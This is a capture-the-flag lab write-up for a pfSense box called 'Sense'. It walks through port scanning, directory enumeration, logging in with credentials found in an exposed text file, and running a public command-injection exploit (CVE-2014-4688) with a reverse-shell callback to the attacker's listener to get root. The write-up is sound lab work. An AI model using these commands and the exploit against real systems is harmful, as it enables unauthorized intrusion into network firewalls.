Sense

Target IP: 10.129.209.180
Challenge Description: N/A.

Reconnaissance


I performed a TCP port scan using the command sudo nmap -sS 10.129.209.180 --top-ports=1000 and obtained the result shown above. I tried using the command -p- but the result was unreliable. It mentioned there were no TCP ports open on the target machine. However, using the command --top-ports=1000 I notice there are two TCP ports open on the target machine: HTTP and HTTPs, as shown above.


Running the command sudo nmap -sV 10.129.209.180 -p 80,443 -A, I obtained the result shown above. The target machine seems to be running lighttpd 1.4.35 on HTTP and HTTPs. The HTTP seems to redirect to HTTPs. A login page is being served by the HTTPs application.

Enumeration

Port 443: HTTPs

The webpage above is displayed for this HTTPs web application. The target machine seems to be running the application pf sense, as shown above. I viewed the source-code of the webpage but I did not find anything useful. I tried to login using the default credentials of the application admin:pfsense, but I had no luck. Time to enumerate further. This box was very buggy as I would lose connection randomly. I had to reset it numerous times. After resetting the box, it now has the IP address of 10.129.37.171.


I performed a directory search using gobuster and the command gobuster dir -u https://10.129.37.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -k and obtained some interesting results, as shown above. However, most of the entries are redirection to the main webpage or rabbit holes.


Browsing to /changelog.txt contains the information shown above. Apparently two out of three vulnerabilities have been patched on the target machine. I wonder what the last vulnerability is. Also, there is a failure in updating the firewall... Hmmm.


I browsed to /system-users.txt and obtained the webpage shown above. It seems to be support ticket submitted to create a user. Now I have the username rohit. But the password is weird. Is it the default password of pf sense application? Time to test it.



And bingo! I used the credentials rohit:pfsense and gained access to the web application, as shown above. Right away, I notice the application version which is 2.1.3. Maybe the application has vulnerabilities?


I Google searched for pf sense 2.1.3 vulnerabilities and found this version is vulnerable to command injection, as shown above. This vulnerability has the CVE ID of CVE-2014-4688. This exploit requires the credentials to run successfully -- which I already have at this point. Time to make a copy of the exploit on my machine and test it against the target machine.


I made a copy of the exploit and saved it on my machine as exp.py. This exploit successfully uses the command injection vulnerability to invoke a reverse shell connection. The arguments required by this exploit is also shown above. I started a listener on my machine at port 8443 to catch the reverse shell connection.

Exploitation & Flags


And bingo! I launched the exploit by using the command python3 exp.py --rhost 10.129.37.171 --lhost 10.10.14.37 --lport 8443 --username rohit --password pfsense. Right after, I instantly obtained a root shell as shown above. No need to perform privilege escalation on the target machine, as I have the highest privileges -- root -- on the target machine :) GG.
